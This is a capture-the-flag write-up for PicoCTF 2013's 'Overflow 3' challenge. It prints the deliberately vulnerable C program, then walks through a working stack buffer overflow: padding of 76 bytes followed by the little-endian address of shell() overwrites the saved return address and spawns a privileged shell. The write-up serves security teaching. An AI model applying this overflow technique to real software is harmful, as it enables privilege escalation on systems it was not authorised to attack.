## PicoCTF 2013: Overflow 3

**Category:** Binary Exploitation
**Points:** 120
**Description:**

>Stack overflows are the most basic binary exploitation technique, but they
>take a lot of skill to master. If you already know some C, these problems can
>help acquaint you with stacks and binary exploitation in general.

>Problem available on the shell machine in
>/problems/stack_overflow_3_28d8a442fb232c0c , downloadable [here](https://2013.picoctf.com/problems/overflow3-28d8a442fb232c0c) with source
>[here](https://2013.picoctf.com/problems/overflow3-28d8a442fb232c0c.c).

>If you solve the problem you will be able to read the key file by running

>cat /problems/stack_overflow_3_28d8a442fb232c0c/key
>on the PicoCTF shell machine.

>**Hint:** objdump -d is a handy tool for this sort of thing.

## Write-up
Let's look at the source code:

```C
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "dump_stack.h"

/*
 * Goal: Get the program to run this function.
 */
void shell(void) {
    execl("/bin/sh", "sh", NULL);
}

void vuln(char *str) {
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 21, (void **) &str);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: buffer_overflow [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    printf("shell function = %p\n", shell);
    vuln(argv[1]);
    return 0;
}
```
Well the code comment makes it fairly plain that we need to call `shell()`

But how? Well let's just put in a bunch of garbage and see what happens:
```
$ ./overflow3-28d8a442fb232c0c $(python -c 'print "A"*64')
shell function = 0x80485f8
Stack dump:
0xffe9fd00: 0xffea0849 (first argument)
0xffe9fcfc: 0x080486bc (saved eip)
0xffe9fcf8: 0xffe9fd28 (saved ebp)
0xffe9fcf4: 0xf7722938
0xffe9fcf0: 0x08048800
0xffe9fcec: 0x41414141
0xffe9fce8: 0x41414141
0xffe9fce4: 0x41414141
0xffe9fce0: 0x41414141
0xffe9fcdc: 0x41414141
0xffe9fcd8: 0x41414141
0xffe9fcd4: 0x41414141
0xffe9fcd0: 0x41414141
0xffe9fccc: 0x41414141
0xffe9fcc8: 0x41414141
0xffe9fcc4: 0x41414141
0xffe9fcc0: 0x41414141
0xffe9fcbc: 0x41414141
0xffe9fcb8: 0x41414141
0xffe9fcb4: 0x41414141
0xffe9fcb0: 0x41414141 (beginning of buffer)
$ strace ./overflow3-28d8a442fb232c0c $(python -c 'print "A"*76 +"BBBB"')
...
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
```
Now you'll notice that the program segfaults at 0x42424242, meaning we have
control over some part of the program. If you look at the prior stackdump,
you'll see a "saved eip." This is called a return address, and it tells the
code where to jump back to after the current function returns. In this case, it
goes back to 0x080486bc in `main()`. However, in the second run, using strace
reveals that we can overwrite that address. Maybe we can supply our own?

Let's use objdump like the hint says:
```
$ objdump -d overflow3-28d8a442fb232c0c | grep ">:"
0804837c <_init>:
080483b0 <setresuid@plt-0x10>:
080483c0 <setresuid@plt>:
080483d0 <printf@plt>:
080483e0 <geteuid@plt>:
080483f0 <strcpy@plt>:
08048400 <puts@plt>:
08048410 <__gmon_start__@plt>:
08048420 <__libc_start_main@plt>:
08048430 <putchar@plt>:
08048440 <execl@plt>:
08048450 <_start>:
08048480 <__do_global_dtors_aux>:
080484e0 <frame_dummy>:
08048504 <dump_stack>:
080485f8 <shell>:
0804861c <vuln>:
08048650 <main>:
080486d0 <__libc_csu_init>:
08048740 <__libc_csu_fini>:
08048742 <__i686.get_pc_thunk.bx>:
08048750 <__do_global_ctors_aux>:
0804877c <_fini>:
```

These are all functions in the binary, and their addresses are on the left. If
you look through them, you'll see that the `shell()` function is in there. Now
if you don't know what endianness is, I suggest you look it up. However for our
purposes, it means that the address's bytes are reversed (two hex digits). x86
is little endian, meaning all addresses in future exploits will need this.

Ex: 08 04 85 f8 becomes f8 85 04 08.

Now since we can't print all these characters, we can use a python escape
sequence to supply them. Remember the "B"s from before overwrote eip, so we
will replace those with our address!

```
$ ./overflow3-28d8a442fb232c0c $(python -c 'print "A"*76 +"\xf8\x85\x04\x08"')
shell function = 0x80485f8
Stack dump:
0xfffd4510: 0xfffd5800 (first argument)
0xfffd450c: 0x080485f8 (saved eip)
0xfffd4508: 0x41414141 (saved ebp)
0xfffd4504: 0x41414141
0xfffd4500: 0x41414141
0xfffd44fc: 0x41414141
0xfffd44f8: 0x41414141
0xfffd44f4: 0x41414141
0xfffd44f0: 0x41414141
0xfffd44ec: 0x41414141
0xfffd44e8: 0x41414141
0xfffd44e4: 0x41414141
0xfffd44e0: 0x41414141
0xfffd44dc: 0x41414141
0xfffd44d8: 0x41414141
0xfffd44d4: 0x41414141
0xfffd44d0: 0x41414141
0xfffd44cc: 0x41414141
0xfffd44c8: 0x41414141
0xfffd44c4: 0x41414141
0xfffd44c0: 0x41414141 (beginning of buffer)
$
```
pwn.

## Other write-ups and resources

* none yet
